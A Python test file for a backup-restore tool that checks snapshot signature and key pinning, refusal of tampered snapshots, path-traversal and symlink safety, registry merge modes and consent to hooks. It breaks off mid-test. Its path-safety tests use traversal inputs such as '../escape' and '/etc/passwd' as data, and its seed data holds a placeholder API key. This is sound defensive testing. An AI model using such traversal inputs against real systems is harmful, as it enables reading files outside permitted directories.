"""Tests for `restore.py` + `hub restore` / `hub source restore` (design v2 §5, §6, §10).

The centrepiece is the BEHAVIOURAL round-trip gate (§10): seed a data home on
"machine A", snapshot it, restore it onto a "machine B" with a different `$HOME`
and different harness homes, sync, and then assert on the RESULT — every
resolved symlink points at something that exists, sync reports no missing
sources, and a fresh snapshot of B reproduces A's byte-for-byte (modulo the
per-machine manifest and audit ledger). A mock could not make any of those true.

Everything runs under the autouse harness-isolation guard from `conftest.py`,
plus a per-test `$HOME` swap, so nothing here can read or write a real harness
dir, a real data home, or a real backup repo.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
from pathlib import Path

import pytest
import yaml

import backup
import hub
import restore


_ANSI = re.compile(r"\x1b\[[0-9;]*m")


def _plain(text: str) -> str:
    return _ANSI.sub("", text)


def _ns(**kw):
    base = {
        "from_": None,
        "branch": None,
        "mode": None,
        "apply": False,
        "force": False,
        "accept_executable_state": False,
        "trust_new_key": False,
        "sync": False,
        "json": False,
    }
    base.update(kw)
    return argparse.Namespace(**base)


# ─────────────────────────────────────────────────────────────────────────────
# Machine fixtures: a whole fake home, swappable mid-test
# ─────────────────────────────────────────────────────────────────────────────


def use_home(monkeypatch, home: Path) -> Path:
    """Point HOME, the data home, and both harness homes at `home`. Returns the data home.

    Swapping `$HOME` is the only way to prove the path transform actually
    travels: with one home, `{HOME}` and `{DATA_HOME}` expand back to the same
    bytes they came from and a no-op transform would pass.
    """
    home.mkdir(parents=True, exist_ok=True)
    (home / ".claude" / "projects").mkdir(parents=True, exist_ok=True)  # makes claude-code "installed"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("SKILL_HUB_HOME", str(home / ".skill-hub"))
    monkeypatch.setenv("SKILL_HUB_CLAUDE_HOME", str(home / ".claude"))
    monkeypatch.setenv("CODEX_HOME", str(home / ".codex"))
    monkeypatch.delenv("SKILL_HUB_DIR", raising=False)
    monkeypatch.delenv("SKILL_HUB_CODE", raising=False)
    hub._DATA_HOME_CACHE = None
    hub._DEPRECATION_WARNED = False
    hub._LEGACY_FALLBACK_WARNED = False
    return hub.data_home()


@pytest.fixture
def outside(tmp_path_factory):
    """A scratch dir OUTSIDE the data home.

    `tmp_data_home` resolves to pytest's `tmp_path` itself, so a project path
    built from `tmp_path` would sit INSIDE the data home — which the snapshot's
    prefix gate (rightly) refuses, for reasons that have nothing to do with what
    these tests are checking.
    """
    return tmp_path_factory.mktemp("outside")


@pytest.fixture
def claude_global_doc(monkeypatch):
    """Re-arm claude-code's `global_doc` (the isolation guard nulls it).

    Rebuilt from the ALREADY-PATCHED registry so `global_mcp_config=None` from
    the other guard survives — otherwise re-arming one field would silently
    un-isolate the user's real `~/.claude.json`.
    """
    import dataclasses
    import harnesses

    from pathlib import PurePath

    patched = dict(harnesses.HARNESSES)
    patched["claude-code"] = dataclasses.replace(
        patched["claude-code"], global_doc=PurePath("~/.claude/CLAUDE.md")
    )
    monkeypatch.setattr(harnesses, "HARNESSES", patched)
    return patched


def write_skill(root: Path, name: str, body: str = "body\n") -> Path:
    d = root / name
    d.mkdir(parents=True, exist_ok=True)
    (d / "SKILL.md").write_text(
        "---\nname: {0}\ndescription: seeded\n---\n{1}".format(name, body)
    )
    return d


def seed_machine_a(home: Path, *, project_out: Path) -> dict:
    """A data home with content on every axis the snapshot claims to carry."""
    dh = hub.data_home()
    write_skill(dh / "skills", "alpha")
    write_skill(dh / "skills", "beta")
    (dh / "snippets").mkdir(parents=True, exist_ok=True)
    (dh / "snippets" / "house-style.md").write_text("house style\n")
    (dh / "mcp-servers" / "notes").mkdir(parents=True, exist_ok=True)
    (dh / "mcp-servers" / "notes" / "server.py").write_text("print('notes')\n")
    (dh / "connectors").mkdir(parents=True, exist_ok=True)
    (dh / "connectors" / "mine.py").write_text("# a drop-in connector\n")

    # sub-agents, in the env-honouring locations the gather code actually reads
    (home / ".claude" / "agents").mkdir(parents=True, exist_ok=True)
    (home / ".claude" / "agents" / "reviewer.md").write_text(
        "---\nname: reviewer\ndescription: reviews\n---\nreview things\n"
    )
    (home / ".codex" / "agents").mkdir(parents=True, exist_ok=True)
    (home / ".codex" / "agents" / "reviewer.toml").write_text(
        'name = "reviewer"\ninstructions = "review things"\n'
    )
    (home / ".claude" / "CLAUDE.md").write_text("# global instructions\n")

    (dh / "state" / "subagents").mkdir(parents=True, exist_ok=True)
    (dh / "state" / "subagents" / "links.json").write_text(
        json.dumps(
            {"links": [{"name": "reviewer", "scope": "user",
                        "harnesses": ["claude-code", "codex"]}]},
            indent=2,
            ensure_ascii=False,
        )
        + "\n"
    )

    # a hook whose command is machine-absolute BY DESIGN (no transform owns it)
    hook_script = home / "bin" / "lint.sh"
    hook_script.parent.mkdir(parents=True, exist_ok=True)
    hook_script.write_text("#!/bin/sh\nexit 0\n")
    hook_script.chmod(0o755)

    # one tilde-collapsed project path, one absolute path outside the home
    proj_in = home / "proj-one"
    proj_in.mkdir(parents=True, exist_ok=True)
    project_out.mkdir(parents=True, exist_ok=True)

    registry = {
        "version": "1",
        "harnesses_global": ["claude-code"],
        "skills": {
            "alpha": {
                "version": "1.0.0",
                "description": "",
                "source": str(dh / "skills" / "alpha"),
                "type": "claude-skill",
                "scope": "portable",
            },
            "beta": {
                "version": "1.0.0",
                "description": "",
                "source": "~/.skill-hub/skills/beta",  # tilde-collapsed on purpose
                "type": "claude-skill",
                "scope": "portable",
            },
            "notes": {
                "version": "1.0.0",
                "description": "",
                "source": str(dh / "mcp-servers" / "notes"),
                "type": "mcp-server",
                "scope": "portable",
                "mcp": {
                    "command": "python3",
                    "args": [str(dh / "mcp-servers" / "notes" / "server.py")],
                    "env": {"NOTES_API_KEY": "sk-livekeyvalue1234567890abcd"},
                },
            },
        },
        "bundles": {"core": {"description": "core", "scope": "project-specific",
                             "skills": ["alpha", "beta"]}},
        "projects": {
            "proj-one": {"path": "~/proj-one", "bundles": ["core"], "enabled": []},
            "proj-out": {"path": str(project_out), "bundles": [], "enabled": ["alpha"]},
        },
        "hooks": {
            "lint": {
                "event": "PostToolUse",
                "command": str(hook_script),
                "tools": ["Edit"],
            }
        },
        "hooks_global": ["lint"],
        "permissions_global": {
            "allow": [{"pattern": "Bash(npm:*)", "kind": "allow"}],
            "deny": [],
            "ask": [],
        },
    }
    hub.save_registry(registry)
    # Let the load-time migrations settle so the snapshot captures a stable shape.
    hub.save_registry(hub.load_registry())
    return registry


def snapshot(dest: Path) -> dict:
    return backup.assemble_snapshot(dest)


def tree_map(root: Path, *, skip=("manifest.json", "manifest.sig", "audit")) -> dict:
    """`{relpath: bytes}` for a snapshot, minus the per-machine files."""
    out: dict = {}
    for path in sorted(Path(root).rglob("*")):
        rel = path.relative_to(root).as_posix()
        if rel == ".git" or rel.startswith(".git/"):
            continue
        if rel in skip or any(rel.startswith(s + "/") for s in skip):
            continue
        if path.is_symlink() or not path.is_file():
            continue
        out[rel] = path.read_bytes()
    return out


# ─────────────────────────────────────────────────────────────────────────────
# 1. Manifest signing + TOFU (design §5 "integrity/trust")
# ─────────────────────────────────────────────────────────────────────────────


def test_snapshot_is_signed_and_verifies(tmp_data_home, tmp_path):
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    summary = snapshot(dest)
    assert summary["signed"] is True
    assert (dest / "manifest.sig").is_file()
    pub = summary["manifest"]["signing"]["pubkey"]
    assert pub.startswith("ssh-")
    verdict = backup.verify_snapshot_signature(dest)
    assert verdict["state"] == backup.SIG_SIGNED, verdict


def test_signature_and_digest_are_not_part_of_the_tree_they_cover(tmp_data_home, tmp_path):
    """A digest that included its own signature could never be verified twice."""
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    assert backup.verify_tree_digest(dest)["ok"] is True
    # …and a re-verify after the sig exists still passes (the circularity check).
    assert backup.verify_tree_digest(dest)["ok"] is True


def test_tampered_snapshot_is_refused(tmp_data_home, tmp_path, monkeypatch):
    """Flip ONE byte of skill content: the digest gate must abort the restore."""
    write_skill(tmp_data_home / "skills", "alpha", body="original\n")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)

    victim = dest / "skills" / "alpha" / "SKILL.md"
    raw = victim.read_bytes()
    victim.write_bytes(raw.replace(b"original", b"0riginal"))

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": str(dest), "detail": ""},
        target_registry={},
        mode="replace",
        data_home=tmp_data_home,
        code_home=None,
        home=Path.home(),
        trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["fatal"] is True
    assert plan["ok"] is False
    assert "digest" in " ".join(plan["errors"]).lower()
    # And nothing past the manifest was even looked at.
    assert "resolved_registry" not in plan


def test_tampered_manifest_fails_the_signature_not_just_the_digest(tmp_data_home, tmp_path):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    manifest = json.loads((dest / "manifest.json").read_text())
    manifest["hostname"] = "somebody-elses-laptop"
    (dest / "manifest.json").write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n")
    verdict = backup.verify_snapshot_signature(dest)
    assert verdict["state"] == backup.SIG_INVALID


def test_unknown_signer_is_tofu_gated_then_pinned(tmp_data_home, tmp_path):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    snap = {"dir": dest, "source": str(dest), "key": restore.source_key(str(dest)), "detail": ""}

    without = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), accept_executable_state=True,
    )
    assert without["integrity"]["trust"]["state"] == restore.TRUST_NEW_KEY
    assert without["ok"] is False
    assert without["fatal"] is False  # gated, not fatal: the dry run still shows you the plan
    assert "UNVERIFIED SNAPSHOT" in " ".join(without["errors"])

    with_flag = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert with_flag["ok"] is True
    restore.apply_plan(with_flag, data_home=tmp_data_home)
    pins = restore.read_pins(tmp_data_home)
    assert restore.source_key(str(dest)) in pins

    # Now the same source verifies silently — no flag needed.
    again = restore.build_plan(
        snap, target_registry=hub._read_registry_optional(), mode="replace",
        data_home=tmp_data_home, code_home=None, home=Path.home(),
        accept_executable_state=True,
    )
    assert again["integrity"]["trust"]["state"] == restore.TRUST_VERIFIED


def test_a_second_signer_for_a_pinned_source_is_consent_gated_then_added(
    tmp_data_home, tmp_path
):
    """A source is a FLEET, so its pin is a SET of signers, not one key.

    The laptop and the desktop push to the same backup repo and each signs with
    its own hub key, so "signed by a key this source has not used before" is the
    ordinary multi-machine case — it must be consent-gated, not refused outright.
    Pinning the second key must not un-pin the first, or every alternating
    restore re-prompts forever.
    """
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    key = restore.source_key(str(dest))
    other = "ssh-ed25519 AAAAsomeothertotallydifferentkey other"
    restore.write_pin(key, other, data_home=tmp_data_home)

    snap = {"dir": dest, "source": str(dest), "key": key, "detail": ""}

    # Without consent it is refused — but as a GATE, not a fatal.
    gated = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), accept_executable_state=True,
    )
    assert gated["integrity"]["trust"]["state"] == restore.TRUST_NEW_KEY
    assert gated["ok"] is False
    assert gated["fatal"] is False
    assert "not among the 1 key(s) pinned" in gated["integrity"]["trust"]["detail"]

    plan = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["fatal"] is False
    assert plan["ok"] is True
    restore.apply_plan(plan, data_home=tmp_data_home)

    # BOTH signers are pinned now, and the accepted one verifies silently.
    from connectors import signing as _signing

    pins = restore.read_pins(tmp_data_home)
    assert len(restore.pinned_keys(pins, key)) == 2
    assert _signing._normalize_pubkey(other) in restore.pinned_keys(pins, key)

    again = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), accept_executable_state=True,
    )
    assert again["integrity"]["trust"]["state"] == restore.TRUST_VERIFIED


def test_two_machines_signing_one_source_both_verify_after_consent(
    tmp_data_home, tmp_path
):
    """The end-to-end multi-machine gate: A-signed then B-signed, both accepted.

    Each snapshot is signed by a DIFFERENT real hub key (re-generated in the
    signing dir between the two), which is the actual fleet shape — not two
    entries hand-written into the pin file.
    """
    from connectors import signing as _signing

    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    source = tmp_path / "snap"

    snapshot(source)
    key_a = backup.manifest_signer(backup.read_manifest(source))
    src_key = restore.source_key(str(source))
    snap = {"dir": source, "source": str(source), "key": src_key, "detail": ""}

    plan_a = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan_a["ok"] is True
    restore.apply_plan(plan_a, data_home=tmp_data_home)

    # Machine B: a different signing key writes the SAME source.
    for leftover in sorted(_signing.signing_dir().glob("*")):
        leftover.unlink()
    snapshot(source)
    key_b = backup.manifest_signer(backup.read_manifest(source))
    assert key_b and key_b.strip() != str(key_a).strip(), "B must sign with a new key"

    gated = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), accept_executable_state=True,
    )
    assert gated["integrity"]["trust"]["state"] == restore.TRUST_NEW_KEY
    assert gated["fatal"] is False, "a second machine is not a substitution attack"

    plan_b = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan_b["ok"] is True
    restore.apply_plan(plan_b, data_home=tmp_data_home)

    # Both keys are pinned; A's key still verifies with no consent at all.
    pins = restore.read_pins(tmp_data_home)
    assert len(restore.pinned_keys(pins, src_key)) == 2
    for pub in (key_a, key_b):
        verdict = {
            "state": backup.SIG_SIGNED,
            "pubkey": pub,
            "key_id": _signing.key_id(pub),
        }
        assert (
            restore.classify_trust(verdict, key=src_key, pins=pins)["state"]
            == restore.TRUST_VERIFIED
        )


def test_a_tampered_snapshot_stays_a_hard_refusal_for_a_pinned_source(
    tmp_data_home, tmp_path
):
    """Widening the key SET must not widen what a bad SIGNATURE buys."""
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    key = restore.source_key(str(dest))
    restore.write_pin(
        key, backup.manifest_signer(backup.read_manifest(dest)), data_home=tmp_data_home
    )
    manifest = json.loads((dest / "manifest.json").read_text())
    manifest["hostname"] = "somebody-elses-laptop"
    (dest / "manifest.json").write_text(
        json.dumps(manifest, indent=2, sort_keys=True) + "\n"
    )

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": key, "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["fatal"] is True
    assert plan["integrity"]["trust"]["state"] == restore.TRUST_INVALID
    assert plan["ok"] is False


def test_a_corrupt_pin_store_is_a_hard_error_not_an_empty_one(tmp_data_home):
    """Failing open here would silently discard every pin this machine holds."""
    path = restore.signers_path(tmp_data_home)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("{not json at all")
    with pytest.raises(restore.RestoreError) as exc:
        restore.read_pins(tmp_data_home)
    assert "corrupt" in str(exc.value)

    path.write_text(json.dumps({"signers": ["not", "a", "mapping"]}))
    with pytest.raises(restore.RestoreError):
        restore.read_pins(tmp_data_home)

    # A store that was never written is the ordinary first-run case.
    path.unlink()
    assert restore.read_pins(tmp_data_home) == {}


def test_a_pinned_source_may_not_downgrade_to_unsigned(tmp_data_home, tmp_path):
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    key = restore.source_key(str(dest))
    pub = backup.manifest_signer(backup.read_manifest(dest))
    restore.write_pin(key, pub, data_home=tmp_data_home)
    (dest / "manifest.sig").unlink()

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": key, "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["integrity"]["trust"]["state"] == restore.TRUST_MISMATCH
    assert plan["fatal"] is True


# ─────────────────────────────────────────────────────────────────────────────
# 2. Path safety (design §5 "reject symlink entries; re-validate after resolve")
# ─────────────────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "evil",
    ["../escape", "a/../../escape", "/etc/passwd", "skills/../../outside"],
)
def test_path_traversal_is_refused(tmp_path, evil):
    with pytest.raises(restore.RestoreError):
        restore._safe_join(tmp_path / "root", evil)


def test_safe_join_catches_an_escape_that_only_appears_after_resolve(tmp_path):
    root = tmp_path / "root"
    (root).mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    os.symlink(outside, root / "link")
    with pytest.raises(restore.RestoreError):
        restore._safe_join(root, "link/pwned")


def test_symlink_entries_in_a_snapshot_are_never_materialized(
    tmp_data_home, tmp_path, monkeypatch
):
    write_skill(tmp_data_home / "skills", "alpha")
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    # Plant a symlink INSIDE the snapshot after it was built, and re-stamp the
    # digest so the entry reaches the materializer rather than being caught by
    # the integrity gate first (that is a different test).
    os.symlink(tmp_path / "elsewhere", dest / "skills" / "alpha" / "sneaky")
    _files, digest = backup.compute_tree_digest(dest)
    manifest = json.loads((dest / "manifest.json").read_text())
    manifest["tree_digest"] = digest
    (dest / "manifest.json").write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n")
    (dest / "manifest.sig").unlink()

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["ok"] is True
    rejected = {r["rel"] for r in plan["rejected"]}
    assert "skills/alpha/sneaky" in rejected
    restore.apply_plan(plan, data_home=tmp_data_home)
    assert not (tmp_data_home / "skills" / "alpha" / "sneaky").exists()


# ─────────────────────────────────────────────────────────────────────────────
# 3. Registry modes (design §5)
# ─────────────────────────────────────────────────────────────────────────────


def _tiny_snapshot(tmp_path: Path, registry: dict, *, data_home: Path) -> Path:
    hub.save_registry(registry)
    dest = tmp_path / ("snap-" + str(len(list(tmp_path.iterdir()))))
    snapshot(dest)
    return dest


def test_non_empty_target_without_a_mode_is_refused_with_a_diff(
    tmp_data_home, tmp_path, outside
):
    write_skill(tmp_data_home / "skills", "alpha")
    incoming = {
        "version": "1",
        "skills": {},
        "bundles": {},
        "projects": {"from-backup": {"path": str(outside / "pb"), "bundles": []}},
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)

    target = {
        "version": "1",
        "skills": {},
        "bundles": {},
        "projects": {"local-only": {"path": str(outside / "lo"), "bundles": []}},
    }
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry=target, mode=None, data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert plan["ok"] is False
    assert plan["registry"]["mode_required"] is True
    assert plan["registry"]["diff"]["sections"]["projects"]["lost"] == ["local-only"]
    joined = " ".join(plan["errors"])
    assert "--mode replace" in joined and "would be LOST" in joined


def test_replace_enumerates_every_entry_and_top_level_key_that_is_lost(tmp_path, tmp_data_home):
    target = {
        "version": "1",
        "projects": {"gone": {"path": "/tmp/gone"}},
        "bundles": {"gone-bundle": {"skills": []}},
        "skills": {},
        "harnesses_global": ["claude-code"],
        "agent_docs": {"root_strategy": "import"},
    }
    incoming = {"version": "1", "projects": {}, "bundles": {}, "skills": {}}
    diff = restore.diff_registry(target, incoming)
    assert diff["sections"]["projects"]["lost"] == ["gone"]
    assert diff["sections"]["bundles"]["lost"] == ["gone-bundle"]
    assert "agent_docs" in diff["top_level_lost"]
    assert "harnesses_global" in diff["top_level_lost"]
    assert diff["totals"]["lost"] == 2


def test_merge_unions_and_lists_conflicts_with_the_backup_winning():
    target = {
        "projects": {"keep": {"path": "/keep"}, "both": {"path": "/local"}},
        "bundles": {},
        "skills": {},
    }
    incoming = {
        "projects": {"new": {"path": "/new"}, "both": {"path": "/backup"}},
        "bundles": {},
        "skills": {},
    }
    diff = restore.diff_registry(target, incoming)
    assert diff["sections"]["projects"]["conflicts"] == ["both"]
    merged = restore.merge_registry(target, incoming)
    assert set(merged["projects"]) == {"keep", "both", "new"}
    assert merged["projects"]["both"]["path"] == "/backup"  # backup wins
    assert merged["projects"]["keep"]["path"] == "/keep"    # nothing lost


def test_replace_preserves_the_machine_local_keys_a_snapshot_never_carries():
    target = {
        "projects": {},
        "signing": {"pubkey": "ssh-ed25519 LOCAL", "key_id": "SHA256:local"},
        "backup": {"dir": "~/.skill-hub-backup", "enabled": True},
        "bootstrap": {"completed_at": "2020-01-01T00:00:00Z"},
    }
    out = restore.replace_registry(target, {"projects": {"a": {}}})
    assert out["signing"] == target["signing"]
    assert out["backup"] == target["backup"]
    assert out["projects"] == {"a": {}}


# ─────────────────────────────────────────────────────────────────────────────
# 4. Executable-state consent (design §5)
# ─────────────────────────────────────────────────────────────────────────────


def test_executable_state_is_enumerated_and_gates_apply(tmp_data_home, tmp_path, outside):
    missing = outside / "nope" / "hook.sh"
    incoming = {
        "version": "1",
        "skills": {}, "bundles": {},
        "projects": {
            "p": {
                "path": str(outside / "p"),
                "permissions": {"allow": [{"pattern": "Bash(git push:*)", "kind": "allow"}]},
            }
        },
        "hooks": {"danger": {"event": "PreToolUse", "command": str(missing) + " --run"}},
        "hooks_global": ["danger"],
        "permissions_global": {"deny": [{"pattern": "Bash(rm:*)", "kind": "deny"}]},
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)
    snap = {"dir": dest, "source": str(dest), "key": "k", "detail": ""}

    plan = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
    )
    exec_state = plan["executable_state"]
    assert [h["name"] for h in exec_state["hooks"]] == ["danger"]
    # The command string is shown VERBATIM — that is the whole point of consent.
    assert exec_state["hooks"][0]["command"] == str(missing) + " --run"
    assert exec_state["hooks"][0]["broken"] is True
    assert str(missing) in exec_state["hooks"][0]["missing_paths"]
    assert exec_state["broken_hooks"] == ["danger"]
    kinds = {(r["kind"], r["pattern"]) for r in exec_state["permission_rules"]}
    assert ("deny", "Bash(rm:*)") in kinds
    assert ("allow", "Bash(git push:*)") in kinds
    assert [t["project"] for t in exec_state["codex_trust"]] == ["p"]
    assert plan["ok"] is False
    assert "--accept-executable-state" in " ".join(plan["errors"])

    accepted = restore.build_plan(
        snap, target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert accepted["ok"] is True
    assert any("do not exist here" in w for w in accepted["warnings"])


def test_an_unbounded_bash_rule_does_not_claim_a_codex_trust_grant():
    """`Bash(*)` is a SkipReason for the Codex adapter, so it grants no trust."""
    registry = {
        "projects": {
            "p": {"path": "/p", "permissions": {"allow": [{"pattern": "Bash(*)", "kind": "allow"}]}}
        }
    }
    assert restore.collect_executable_state(registry)["codex_trust"] == []


def test_machine_absolute_fields_are_reported_per_entry(tmp_path):
    registry = {
        "hooks": {"h": {"event": "PostToolUse", "command": "/opt/tools/lint.sh --fix"}},
        "projects": {
            "p": {
                "path": "/p",
                "hook_settings": {"h": {"config": "/etc/lint.toml"}},
                "permissions": {"additional_dirs": ["/srv/shared"]},
            }
        },
        "permissions_global": {"additional_dirs": ["~/scratch"]},
    }
    found = {(e["field"], e["value"]) for e in restore.collect_machine_absolute(registry)}
    assert ("hooks.h.command", "/opt/tools/lint.sh") in found
    assert ("projects.p.hook_settings.h.config", "/etc/lint.toml") in found
    assert ("projects.p.permissions.additional_dirs[0]", "/srv/shared") in found
    assert ("permissions_global.additional_dirs[0]", "~/scratch") in found


# ─────────────────────────────────────────────────────────────────────────────
# 5. Three-way collision on out-of-home files (design §5)
# ─────────────────────────────────────────────────────────────────────────────


def _agents_snapshot(tmp_data_home, tmp_path, monkeypatch, agent_body: str) -> Path:
    agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    agents.mkdir(parents=True, exist_ok=True)
    (agents / "reviewer.md").write_text(agent_body)
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)
    return dest


def test_three_way_identical_skips_missing_writes_differs_writes_a_sibling(
    tmp_data_home, tmp_path, monkeypatch
):
    dest = _agents_snapshot(tmp_data_home, tmp_path, monkeypatch, "from the backup\n")
    agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    snap = {"dir": dest, "source": str(dest), "key": "k", "detail": ""}

    def _plan(force=False):
        return restore.build_plan(
            snap, target_registry={}, mode="replace", data_home=tmp_data_home,
            code_home=None, home=Path.home(), trust_new_key=True,
            accept_executable_state=True, force=force,
        )

    # (a) identical → skip
    item = next(i for i in _plan()["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "skip"

    # (b) missing → write
    (agents / "reviewer.md").unlink()
    plan = _plan()
    item = next(i for i in plan["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "write"
    restore.apply_plan(plan, data_home=tmp_data_home)
    assert (agents / "reviewer.md").read_text() == "from the backup\n"

    # (c) differs → sibling, and the LOCAL file is left exactly as it was
    (agents / "reviewer.md").write_text("edited on this machine\n")
    plan = _plan()
    item = next(i for i in plan["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "sibling"
    restore.apply_plan(plan, data_home=tmp_data_home)
    assert (agents / "reviewer.md").read_text() == "edited on this machine\n"
    assert (agents / "reviewer.md.from-backup").read_text() == "from the backup\n"

    # (d) --force overwrites, but only after backing the local file up
    plan = _plan(force=True)
    item = next(i for i in plan["subagents"] if i["name"] == "reviewer.md")
    assert item["action"] == "overwrite"
    result = restore.apply_plan(plan, data_home=tmp_data_home)
    assert (agents / "reviewer.md").read_text() == "from the backup\n"
    saved = [b for b in result["backups"] if b["source"].endswith("reviewer.md")]
    assert saved and Path(saved[0]["backup"]).read_text() == "edited on this machine\n"


def test_links_are_filtered_to_members_that_actually_landed(tmp_data_home, tmp_path):
    claude_agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    claude_agents.mkdir(parents=True, exist_ok=True)
    (claude_agents / "reviewer.md").write_text("---\nname: reviewer\n---\nr\n")
    (tmp_data_home / "state" / "subagents").mkdir(parents=True, exist_ok=True)
    (tmp_data_home / "state" / "subagents" / "links.json").write_text(
        json.dumps(
            {
                "links": [
                    # both members present in the snapshot
                    {"name": "reviewer", "scope": "user", "harnesses": ["claude-code"]},
                    # a member that was never captured → must be dropped
                    {"name": "ghost", "scope": "user", "harnesses": ["claude-code", "codex"]},
                ]
            }
        )
    )
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)

    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    assert [l["name"] for l in plan["links"]["restored"]] == ["reviewer"]
    dropped = plan["links"]["dropped"]
    assert [d["name"] for d in dropped] == ["ghost"]
    assert "codex" in dropped[0]["reason"]


def test_links_merge_with_the_targets_existing_entries(tmp_data_home, tmp_path):
    import subagent_links

    claude_agents = Path(os.environ["SKILL_HUB_CLAUDE_HOME"]) / "agents"
    claude_agents.mkdir(parents=True, exist_ok=True)
    (claude_agents / "reviewer.md").write_text("---\nname: reviewer\n---\nr\n")
    (tmp_data_home / "state" / "subagents").mkdir(parents=True, exist_ok=True)
    (tmp_data_home / "state" / "subagents" / "links.json").write_text(
        json.dumps({"links": [{"name": "reviewer", "scope": "user",
                               "harnesses": ["claude-code"]}]})
    )
    hub.save_registry({"version": "1", "skills": {}, "projects": {}, "bundles": {}})
    dest = tmp_path / "snap"
    snapshot(dest)

    # A pre-existing local link that the snapshot knows nothing about.
    subagent_links.write_links(
        [{"name": "local-only", "scope": "user", "harnesses": ["claude-code"]}]
    )
    plan = restore.build_plan(
        {"dir": dest, "source": str(dest), "key": "k", "detail": ""},
        target_registry={}, mode="replace", data_home=tmp_data_home,
        code_home=None, home=Path.home(), trust_new_key=True,
        accept_executable_state=True,
    )
    restore.apply_plan(plan, data_home=tmp_data_home)
    names = {e["name"] for e in subagent_links.read_links()[0]}
    assert names == {"reviewer", "local-only"}


# ─────────────────────────────────────────────────────────────────────────────
# 6. Quarantine + the phantom-tree regression (design §5)
# ─────────────────────────────────────────────────────────────────────────────


def test_a_missing_project_path_is_quarantined_not_dropped(tmp_data_home, tmp_path, outside):
    incoming = {
        "version": "1",
        "skills": {}, "bundles": {},
        "projects": {"ghost": {"path": str(outside / "never-cloned"), "bundles": []}},
    }
    dest = _tiny_snapshot(tmp_path, incoming, data_home=tmp_data_home)
    plan = restore.build_plan(
